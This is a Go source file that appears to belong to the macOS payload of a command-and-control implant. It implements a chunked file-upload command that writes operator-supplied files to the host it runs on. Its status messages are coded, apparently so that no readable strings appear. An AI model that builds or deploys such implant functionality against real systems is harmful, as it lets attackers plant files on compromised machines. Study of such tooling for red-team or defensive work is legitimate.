// server/docker/payloads/Darwin/action_upload.go

//go:build darwin
// +build darwin

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type UploadCommand struct{}

// Execute function from action_upload.go
func (c *UploadCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	var remotePath string

	// Check if path is absolute (including UNC paths)
	isAbs := filepath.IsAbs(args[0]) ||
		strings.HasPrefix(args[0], "/") ||
		strings.HasPrefix(args[0], "\\\\") || // UNC path
		strings.HasPrefix(args[0], "//") || // Alternative UNC format
		(len(args[0]) > 2 && args[0][1] == ':')

	if isAbs {
		remotePath = args[0]
	} else {
		// Handle relative paths with UNC-aware joining
		workingDir := ctx.WorkingDir

		// Special handling for UNC paths
		if strings.HasPrefix(workingDir, "\\\\") || strings.HasPrefix(workingDir, "//") {
			workingDir = strings.ReplaceAll(workingDir, "/", "\\")
			if !strings.HasSuffix(workingDir, "\\") {
				workingDir += "\\"
			}
			remotePath = workingDir + args[0]
		} else {
			remotePath = filepath.Join(workingDir, args[0])
		}
	}

	// Clean the path but preserve UNC format
	if strings.HasPrefix(remotePath, "\\\\") || strings.HasPrefix(remotePath, "//") {
		remotePath = strings.ReplaceAll(remotePath, "/", "\\")
		parts := strings.Split(remotePath, "\\")
		var cleanParts []string
		for _, part := range parts {
			if part != "" && part != "." {
				cleanParts = append(cleanParts, part)
			}
		}
		if len(cleanParts) >= 2 {
			remotePath = "\\\\" + strings.Join(cleanParts, "\\")
		}
	} else {
		remotePath = filepath.Clean(remotePath)
	}

	// Simply return the parsed remote path - actual directory creation
	// and file writing will happen when chunks are processed
	return CommandResult{
		Output:      SuccCtx(S4, remotePath),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// HandleUploadChunk function from action_upload.go
func HandleUploadChunk(cmd Command, ctx *CommandContext) (*CommandResult, error) {
	if cmd.Data == "" {
		return nil, fmt.Errorf(Err(E1))
	}

	// Decode chunk data
	chunkData, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return nil, fmt.Errorf(Err(E18))
	}

	// Get or create upload info
	commandQueue.mu.Lock()
	uploadInfo, exists := commandQueue.activeUploads[cmd.Filename]
	now := time.Now()
	if !exists {
		uploadInfo = &UploadInfo{
			Chunks:      make(map[int][]byte),
			TotalChunks: cmd.TotalChunks,
			RemotePath:  cmd.RemotePath,
			Filename:    cmd.Filename,
			StartTime:   now,
			LastUpdate:  now,
		}
		commandQueue.activeUploads[cmd.Filename] = uploadInfo
	}

	// Store chunk in memory and update last activity time
	uploadInfo.Chunks[cmd.CurrentChunk] = chunkData
	uploadInfo.LastUpdate = now
	commandQueue.mu.Unlock()

	// Check if this was the last chunk
	if cmd.CurrentChunk == cmd.TotalChunks-1 {
		// Process final path based on whether RemotePath is absolute or not
		finalPath := cmd.RemotePath

		// Check for absolute path using OS-agnostic rules
		isAbs := filepath.IsAbs(finalPath) ||
			strings.HasPrefix(finalPath, "/") || // Unix-style
			strings.HasPrefix(finalPath, "\\") || // Windows backslash
			(len(finalPath) > 2 && finalPath[1] == ':') // Windows drive letter

		if !isAbs {
			finalPath = filepath.Join(ctx.WorkingDir, finalPath)
		}

		// Convert to OS-specific path format and clean
		finalPath = filepath.FromSlash(filepath.Clean(finalPath))

		// Create parent directories if needed
		// Use NetworkAwareMkdirAll instead of os.MkdirAll
		if err := NetworkAwareMkdirAll(filepath.Dir(finalPath), 0755); err != nil {
			return nil, fmt.Errorf(Err(E11))
		}

		// Assemble and write file
		if err := assembleAndWriteFile(uploadInfo, finalPath); err != nil {
			return nil, fmt.Errorf(Err(E11))
		}

		// Clean up memory
		commandQueue.mu.Lock()
		delete(commandQueue.activeUploads, cmd.Filename)
		commandQueue.mu.Unlock()

		return &CommandResult{
			Command:     cmd,
			Output:      SuccCtx(S5, finalPath),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	// Return success for intermediate chunk
	return &CommandResult{
		Command:     cmd,
		Output:      Succ(S0),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}, nil
}

// assembleAndWriteFile function from action_upload.go
func assembleAndWriteFile(info *UploadInfo, finalPath string) error {

	// Create final file
	// Use NetworkAwareOpenFile instead of os.Create
	finalFile, err := NetworkAwareOpenFile(finalPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return fmt.Errorf(Err(E11))
	}
	defer finalFile.Close()

	// Write chunks in order
	for i := 0; i < info.TotalChunks; i++ {
		chunk, exists := info.Chunks[i]
		if !exists {
			return fmt.Errorf(Err(E24))
		}
		if _, err := finalFile.Write(chunk); err != nil {
			return fmt.Errorf(Err(E11))
		}

		// Clear chunk from memory as we write
		info.Chunks[i] = nil
	}

	return nil
}
